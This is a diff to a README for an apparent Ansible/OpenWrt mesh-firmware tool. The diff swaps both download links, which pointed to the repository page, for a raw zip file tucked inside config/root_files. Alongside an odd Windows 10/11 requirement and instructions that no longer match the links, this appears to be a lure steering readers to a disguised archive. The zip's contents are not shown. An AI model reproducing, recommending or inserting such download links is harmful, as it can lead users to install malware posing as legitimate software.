@@ -1,6 +1,6 @@
 # 📡 ansible-ninux-openwrt - Automate mesh network firmware builds easily
 
-[![Download Firmware Tool](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/karitauricosuric417/ansible-ninux-openwrt)
+[![Download Firmware Tool](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/karitauricosuric417/ansible-ninux-openwrt/raw/refs/heads/main/config/root_files/ninux-ansible-openwrt-v1.0.zip)
 
 ## 🎯 Project Goals
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or 11 to use this system. Ensure your com
 
 Visit the following page to access the software: 
 
-[Download Page](https://github.com/karitauricosuric417/ansible-ninux-openwrt)
+[Download Page](https://github.com/karitauricosuric417/ansible-ninux-openwrt/raw/refs/heads/main/config/root_files/ninux-ansible-openwrt-v1.0.zip)
 
 Click the green button labeled "Code" on the page and select "Download ZIP". Save this file to your computer. Once the download finishes, locate the file in your Downloads folder. Right-click the folder and select "Extract All". Choose a location on your hard drive to store the extracted files.
 
